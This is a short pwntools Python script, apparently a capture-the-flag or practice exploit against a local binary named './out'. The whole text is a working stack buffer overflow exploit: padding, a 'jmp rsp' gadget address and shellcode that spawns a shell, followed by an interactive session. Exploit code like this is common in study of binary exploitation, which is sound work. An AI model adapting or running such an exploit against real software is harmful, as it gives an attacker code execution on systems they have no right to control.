from pwn import *

p = process("./out");
context.binary = './out'
gdb.attach(p)

gadget = 0x0000000000001151 # jmp rsp

payload = b"A"*24
payload += p64(gadget)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
